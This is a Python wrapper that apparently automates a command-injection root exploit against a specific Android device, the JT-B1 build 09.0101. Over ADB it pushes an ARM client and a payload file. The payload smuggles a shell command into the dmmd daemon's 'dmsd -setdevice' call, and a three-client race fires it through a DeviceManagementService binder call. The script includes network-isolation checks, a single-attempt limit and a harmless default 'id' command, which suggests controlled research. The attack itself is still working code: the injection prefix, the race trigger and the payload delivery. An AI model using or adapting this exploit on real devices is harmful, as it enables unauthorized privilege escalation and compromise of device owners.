#!/usr/bin/env python3
"""Run ONE dmmd command-injection attempt on an isolated, stock JT-B1.

The ARM client is the source used in the successful 2026-11-04 experiment.
This PC wrapper adds target/preflight checks; it has not been rerun on hardware.
It never disables networking, remounts partitions, installs su or reboots.
"""
import argparse
import os
import re
import subprocess
import tempfile
import time
from pathlib import Path

QUERY = ('getprop init.svc.dmmd; getprop sys.psn.dm.service.dmm.enable; '
         'getprop sys.psn.dm.service.dmm.port')
PREFIX = b'-dmsdon</proc/self/fd/2147483647; '
CLIENT = '/data/local/tmp/client_file'
PAYLOAD = '/data/local/tmp/rootpayload.bin'


def payload(command):
    if not command.strip() or '\0' in command:
        raise ValueError('a nonempty shell command without NUL is required')
    data = PREFIX + command.encode('utf-8')
    # The daemon uses snprintf(256, "dmsd -setdevice %s", suffix).
    # The historical wrapper conservatively limits the WHOLE wire payload.
    if len(data) > 240:
        raise ValueError('payload exceeds 240 bytes')
    return data


def isolated(network):
    rows = [line.split() for line in network.splitlines() if line.split()]
    return bool(rows) and all(len(row) >= 2 and (row[0] == 'lo' or row[1] == 'DOWN') for row in rows)


def inactive(state):
    rows = state.replace('\r', '').split('\n')
    return len(rows) >= 3 and rows[0] == 'stopped' and rows[1] == '0' and not rows[2]


class Adb:
    def __init__(self, serial):
        self.base = ['adb', '-s', serial]

    def call(self, *args, timeout=30):
        result = subprocess.run(self.base + list(args), stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE, timeout=timeout, check=False)
        if result.returncode:
            # Do not leak serials, commands or arbitrary device output in errors.
            raise RuntimeError('ADB operation failed; inspect the device privately')
        return result.stdout.decode('utf-8', errors='replace').replace('\r', '')

    def shell(self, command, timeout=30):
        return self.call('shell', command, timeout=timeout)


def preflight(adb):
    identity = adb.shell('getprop ro.product.model; getprop ro.build.display.id; id')
    if not identity.startswith('JT-B1\n09.0101\nuid=2000(shell)'):
        raise RuntimeError('requires stock JT-B1 build 09.0101 and ADB shell UID 2000')
    if not isolated(adb.shell('netcfg')):
        raise RuntimeError('all non-loopback interfaces must already be DOWN; isolate manually')
    if not inactive(adb.shell(QUERY)):
        raise RuntimeError('dmmd baseline must be stopped, enable=0, port empty')
    if adb.shell('ls /data/local/tmp/client_file /data/local/tmp/rootpayload.bin 2>/dev/null').strip():
        raise RuntimeError('fixed remote scratch paths already exist; inspect them manually')


def execute(adb, client, data):
    preflight(adb)
    if not client.is_file():
        raise ValueError('build the ARM client first')
    header = client.read_bytes()[:20]
    if (len(header) != 20 or header[:7] != b'\x7fELF\x01\x01\x01'
            or int.from_bytes(header[18:20], 'little') != 40):
        raise ValueError('client must be a 32-bit little-endian ARM ELF')
    with tempfile.TemporaryDirectory(prefix='jtb1-root-') as tmp:
        local = Path(tmp) / 'payload'
        local.write_bytes(data)
        local.chmod(0o600)
        adb.call('push', str(local), PAYLOAD)
        adb.call('push', str(client), CLIENT)
    adb.shell('chmod 600 ' + PAYLOAD + '; chmod 755 ' + CLIENT)
    # Historical three-client race, exactly ONE getter transaction, no retry.
    # Client lifetime is 8s while connecting; a connected command may run longer.
    # This deliberately does not collect client replies (which may contain secrets).
    trigger = ("for i in 1 2 3; do " + CLIENT + " >/dev/null 2>&1 & done; "
               "sleep 0.5; service call DeviceManagementService 12 >/dev/null")
    try:
        adb.shell(trigger, timeout=25)
    finally:
        # Even after a timeout, do not retry. Check daemon state, keep isolation.
        restored = False
        for _ in range(16):
            if inactive(adb.shell(QUERY)):
                restored = True
                break
            time.sleep(1)
        if not restored:
            raise RuntimeError('dmmd stop is unverified; KEEP NETWORKS DOWN, do not retry')
    # No automatic deletion: the scratch file may still be open or be evidence.
    return 'One getter issued; dmmd stopped. Verify command output privately. No success claim from ADB exit alone.'


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--serial', required=True, help='explicit ADB device; never auto-select')
    parser.add_argument('--client', type=Path, default=Path(__file__).resolve().parents[2] / 'build/dmmd-client')
    parser.add_argument('--command', default='id > /data/local/tmp/jtb1-root-id.txt', help='trusted shell command, at most 240 bytes including prefix')
    parser.add_argument('--execute', action='store_true', help='acknowledge a real root-exploit attempt and scratch writes')
    args = parser.parse_args()
    data = payload(args.command)
    if not args.execute:
        parser.error('--execute is required; no ADB operations performed')
    print(execute(Adb(args.serial), args.client, data))


if __name__ == '__main__':
    main()
